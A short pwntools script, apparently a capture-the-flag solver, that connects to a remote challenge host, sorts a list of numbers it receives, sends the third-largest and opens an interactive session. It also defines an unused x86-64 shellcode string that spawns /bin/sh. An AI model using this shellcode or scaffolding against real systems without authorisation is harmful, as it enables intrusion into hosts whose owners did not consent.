from pwn import remote, struct

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

def p32(x):
    return struct.pack('I', x)
def p64(x):
    return struct.pack('Q', x)

r = remote('120.114.62.209', 2400)
r.recvlines(7)
data = r.recvuntil(b'\n').decode().replace('numbers : ', "")
data = [int(i) for i in data.split(' ')]
data.sort()
r.sendline(str(data[-3]).encode() + b'\n')

r.interactive()
